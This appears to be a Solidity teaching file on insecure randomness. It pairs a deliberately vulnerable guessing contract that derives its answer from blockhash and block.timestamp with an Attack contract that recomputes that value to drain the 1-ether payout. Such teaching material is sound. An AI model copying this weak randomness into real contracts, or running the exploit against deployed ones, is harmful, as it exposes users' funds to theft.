// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Insecure source of randomness
- Vulnerability (source randomness)
    - block.timestamp
    - blockhash
- Contrat using insecure randomness
- How to exploit the contract
- Code and demo
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether"); 
        }
    }
}

contract Attack {
    fallback() external payable {}
    
    function attack(GuessTheRandomNumber _guessTheRandomNumber) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        _guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}